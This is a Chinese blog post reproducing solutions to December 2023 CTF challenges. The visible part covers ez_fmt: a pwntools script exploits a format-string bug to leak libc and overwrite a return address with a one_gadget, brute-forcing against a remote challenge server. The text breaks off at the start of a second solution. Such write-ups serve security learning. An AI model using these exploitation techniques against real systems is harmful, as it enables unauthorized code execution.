<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>2023 12月比赛wp复现 - </title><meta name="author" content="chuwei">
<meta name="description" content=""><meta name="keywords" content='赛题复现'>
  <meta itemprop="name" content="2023 12月比赛wp复现">
  <meta itemprop="datePublished" content="2023-12-29T15:09:10+08:00">
  <meta itemprop="dateModified" content="2025-01-04T23:47:07+08:00">
  <meta itemprop="wordCount" content="5392">
  <meta itemprop="image" content="https://chuw3i.github.io/logo.jpg">
  <meta itemprop="keywords" content="赛题复现"><meta property="og:url" content="https://chuw3i.github.io/posts/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/">
  <meta property="og:title" content="2023 12月比赛wp复现">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-12-29T15:09:10+08:00">
    <meta property="article:modified_time" content="2025-01-04T23:47:07+08:00">
    <meta property="article:tag" content="赛题复现">
    <meta property="og:image" content="https://chuw3i.github.io/logo.jpg">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://chuw3i.github.io/logo.jpg">
  <meta name="twitter:title" content="2023 12月比赛wp复现">
<meta name="application-name" content="chuwei的小站">
<meta name="apple-mobile-web-app-title" content="chuwei的小站"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" type="text/html" href="https://chuw3i.github.io/posts/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/" title="2023 12月比赛wp复现 - " /><link rel="prev" type="text/html" href="https://chuw3i.github.io/posts/stack-challenge/" title="Stack Challenge" /><link rel="next" type="text/html" href="https://chuw3i.github.io/about/" title="About" /><link rel="alternate" type="text/markdown" href="https://chuw3i.github.io/posts/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/index.md" title="2023 12月比赛wp复现 - "><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "2023 12月比赛wp复现",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/chuw3i.github.io\/posts\/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0\/"
    },"genre": "posts","keywords": "赛题复现","wordcount":  5392 ,
    "url": "https:\/\/chuw3i.github.io\/posts\/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0\/","datePublished": "2023-12-29T15:09:10+08:00","dateModified": "2025-01-04T23:47:07+08:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "chuwei"
      },"description": ""
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="auto" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title=""><img class="logo" src='/logo.jpg' alt="/logo.jpg" height="32" width="32"><span class="header-title-text">chuwei的博客</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 归档</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title=""><img class="logo" src='/logo.jpg' alt="/logo.jpg" height="26" width="26"><span class="header-title-text">chuwei的博客</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 归档</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"><div class="details collection-details open">
      <div class="details-summary collection-summary">
        <i class="fa-solid fa-layer-group fa-fw" aria-hidden="true"></i>
        <span class="collection-name" title="合集">赛题复现</span>
        <span class="collection-count">1</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content collection-content">
        <nav>
          <ul class="collection-list"><li class="collection-item"><span class="active" title="2023 12月比赛wp复现">2023 12月比赛wp复现</span></li></ul>
          <div class="collection-nav-simple"><i class="fa-solid fa-angle-left fa-fw collection-nav-item text-secondary" aria-hidden="true"></i><span class="text-secondary">1/1</span><i class="fa-solid fa-angle-right fa-fw collection-nav-item text-secondary" aria-hidden="true"></i></div>
        </nav>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>2023 12月比赛wp复现</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img class="avatar" src='/logo.jpg' alt="chuwei" height="16" width="16">&nbsp;chuwei</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" class="post-category" title="分类 - 赛题复现"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 赛题复现</a> 和 <a href="/collections/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" class="post-collection" title="合集 - 赛题复现"><i class="fa-solid fa-layer-group fa-fw" aria-hidden="true"></i> 赛题复现</a></span></div><div class="post-meta-line"><span title="发布于 2023-12-29 15:09:10"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-12-29">2023-12-29</time></span>&nbsp;<span title="更新于 2025-01-04 23:47:07"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-01-04">2025-01-04</time></span>&nbsp;<span title="5392 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 5400 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 26 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#强网杯">强网杯</a>
      <ul>
        <li><a href="#ez_fmt">ez_fmt</a>
          <ul>
            <li><a href="#解法一">解法一</a></li>
            <li><a href="#解法二">解法二</a></li>
          </ul>
        </li>
        <li><a href="#warmup23">warmup23</a></li>
        <li><a href="#chatting">chatting</a>
          <ul>
            <li><a href="#解法一-1">解法一</a></li>
            <li><a href="#解法二-1">解法二</a></li>
          </ul>
        </li>
        <li><a href="#simpleinterpreter">simpleinterpreter</a></li>
        <li><a href="#wtoa">WTOA</a>
          <ul>
            <li><a href="#后记">后记</a></li>
          </ul>
        </li>
        <li><a href="#trie">trie</a></li>
        <li><a href="#a-rstp">A-rstp</a></li>
      </ul>
    </li>
    <li><a href="#安洵杯-i-soon-x-d0g3">安洵杯 I-SOON x D0g3</a>
      <ul>
        <li><a href="#side_channel--initiate">side_channel , initiate!</a></li>
        <li><a href="#seccomp">Seccomp</a></li>
        <li><a href="#my_qq">my_QQ</a></li>
      </ul>
    </li>
    <li><a href="#nctf">NCTF</a>
      <ul>
        <li><a href="#checkin">checkin</a></li>
        <li><a href="#nception">nception</a>
          <ul>
            <li><a href="#思路一">思路一</a></li>
            <li><a href="#思路二">思路二</a></li>
            <li><a href="#待做">待做</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="强网杯"><span>强网杯</span>
  <a href="#%e5%bc%ba%e7%bd%91%e6%9d%af" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 class="heading-element" id="ez_fmt"><span>ez_fmt</span>
  <a href="#ez_fmt" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 class="heading-element" id="解法一"><span>解法一</span>
  <a href="#%e8%a7%a3%e6%b3%95%e4%b8%80" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>程序开头给了stack 地址，利用格式化字符串漏洞修改返回地址，爆破one_gadget ，概率为1/4096。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#context.log_level=&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">&#34;b *0x401239&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">i</span><span class="o">=</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;47.104.24.40&#39;</span><span class="p">,</span><span class="mi">1337</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#p=process(&#34;./ez_fmt&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;There is a gift for you &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">stack_addr</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">lg</span><span class="p">(</span><span class="s2">&#34;stack_addr&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">lg</span><span class="p">(</span><span class="s2">&#34;i&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">w_addr</span><span class="o">=</span><span class="mh">0x0404010</span> 
</span></span><span class="line"><span class="cl">    <span class="n">ret_addr</span><span class="o">=</span><span class="n">stack_addr</span><span class="o">+</span><span class="mh">0x68</span>
</span></span><span class="line"><span class="cl">    <span class="n">main_addr</span><span class="o">=</span><span class="mh">0x401196</span>
</span></span><span class="line"><span class="cl">    <span class="n">lg</span><span class="p">(</span><span class="s2">&#34;ret_addr&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="o">=</span><span class="s2">&#34;%19$p&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="o">+=</span><span class="s2">&#34;%&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x40</span><span class="o">-</span><span class="mi">14</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;c&#34;</span><span class="o">+</span><span class="s2">&#34;%10$hhn&#34;</span><span class="o">+</span><span class="s2">&#34;%&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="mh">0xfb01</span><span class="o">-</span><span class="mh">0x40</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;c&#34;</span><span class="o">+</span><span class="s2">&#34;%11$hn&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#mydbg()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># pause()</span>
</span></span><span class="line"><span class="cl">    <span class="n">libc_base</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">rn</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x24083</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">one_gaget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0xe3b01</span>
</span></span><span class="line"><span class="cl">    <span class="n">lg</span><span class="p">(</span><span class="s2">&#34;one_gaget&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">myogg</span><span class="o">=</span><span class="p">(</span><span class="n">libc_base</span><span class="o">&amp;</span><span class="mh">0xffffffffff000000</span><span class="p">)</span><span class="o">+</span><span class="mh">0x40fb01</span>
</span></span><span class="line"><span class="cl">    <span class="n">lg</span><span class="p">(</span><span class="s2">&#34;myogg&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">myogg</span><span class="o">==</span><span class="n">one_gaget</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;success&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111725.png' alt="image-20231216113044144"></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111726.png' alt="image-20231216113047514"></p>
<h4 class="heading-element" id="解法二"><span>解法二</span>
  <a href="#%e8%a7%a3%e6%b3%95%e4%ba%8c" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>利用格式化字符串漏洞篡改printf 函数的返回地址为start，同时泄露libc，这样就不会修改w为0，然后第二次格式化字符串漏洞修改返回地址为one gadget。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
